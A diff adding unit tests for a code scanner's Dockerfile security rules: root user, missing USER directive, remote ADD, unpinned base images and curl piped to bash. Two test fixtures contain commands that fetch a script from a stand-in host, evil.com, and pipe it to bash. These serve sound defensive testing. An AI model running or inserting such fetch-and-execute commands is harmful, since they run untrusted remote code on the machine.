@@ -435,6 +435,96 @@ describe("scanCommit", () => {
   });
 });
 
+// ─── Dockerfile container security rules ──────────────────────────────────────
+
+describe("Dockerfile container security rules", () => {
+  it("detects USER root in Dockerfile", () => {
+    const content = "FROM node:18\nRUN apt-get install -y curl\nUSER root\nCMD [\"node\", \"server.js\"]";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-run-as-root")).toBe(true);
+  });
+
+  it("does not flag USER appuser in Dockerfile", () => {
+    const content = "FROM node:18\nUSER appuser\nCMD [\"node\", \"server.js\"]";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-run-as-root")).toBe(false);
+  });
+
+  it("detects missing USER directive in Dockerfile", () => {
+    const content = "FROM node:18\nRUN npm install\nCMD [\"node\", \"server.js\"]";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-no-user-directive")).toBe(true);
+  });
+
+  it("does not flag missing USER when USER directive is present", () => {
+    const content = "FROM node:18\nUSER node\nCMD [\"node\", \"server.js\"]";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-no-user-directive")).toBe(false);
+  });
+
+  it("does not apply Dockerfile rules to non-Dockerfile files", () => {
+    const content = "FROM node:18\nUSER root\n";
+    const findings = scanFileContent(content, "src/index.ts");
+    expect(findRule(findings, "docker-run-as-root")).toBe(false);
+    expect(findRule(findings, "docker-no-user-directive")).toBe(false);
+  });
+
+  it("detects ADD with a remote URL in Dockerfile", () => {
+    const content = "FROM ubuntu:22.04\nUSER www\nADD https://example.com/file.tar.gz /tmp/";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-add-remote-url")).toBe(true);
+  });
+
+  it("does not flag ADD with a local path in Dockerfile", () => {
+    const content = "FROM ubuntu:22.04\nUSER www\nADD ./app /app";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-add-remote-url")).toBe(false);
+  });
+
+  it("detects FROM with :latest tag in Dockerfile", () => {
+    const content = "FROM node:latest\nUSER node\nCMD [\"node\"]";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-latest-tag")).toBe(true);
+  });
+
+  it("detects FROM with no tag in Dockerfile", () => {
+    const content = "FROM node\nUSER node\nCMD [\"node\"]";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-latest-tag")).toBe(true);
+  });
+
+  it("does not flag FROM with a pinned version tag", () => {
+    const content = "FROM node:18.20.4\nUSER node\nCMD [\"node\"]";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-latest-tag")).toBe(false);
+  });
+
+  it("does not flag FROM scratch (base image for static binaries)", () => {
+    const content = "FROM scratch\nCOPY binary /binary\nCMD [\"/binary\"]";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-latest-tag")).toBe(false);
+  });
+
+  it("detects RUN curl|bash in Dockerfile", () => {
+    const content = "FROM ubuntu\nUSER www\nRUN curl https://evil.com/install.sh | bash";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-curl-pipe-bash")).toBe(true);
+  });
+
+  it("does not flag safe curl usage in Dockerfile", () => {
+    const content = "FROM ubuntu\nUSER www\nRUN curl -o /tmp/file.tar.gz https://example.com/file.tar.gz";
+    const findings = scanFileContent(content, "Dockerfile");
+    expect(findRule(findings, "docker-curl-pipe-bash")).toBe(false);
+  });
+
+  it("applies rules to .dockerfile extension files", () => {
+    const content = "FROM node:latest\nRUN curl https://evil.com | bash";
+    const findings = scanFileContent(content, "apps/api/api.dockerfile");
+    expect(findRule(findings, "docker-latest-tag")).toBe(true);
+    expect(findRule(findings, "docker-curl-pipe-bash")).toBe(true);
+  });
+});
+
 describe("logger", () => {
   it("covers error formatting with error object containing stack trace", () => {
     const mockError = new Error("Test error for coverage");
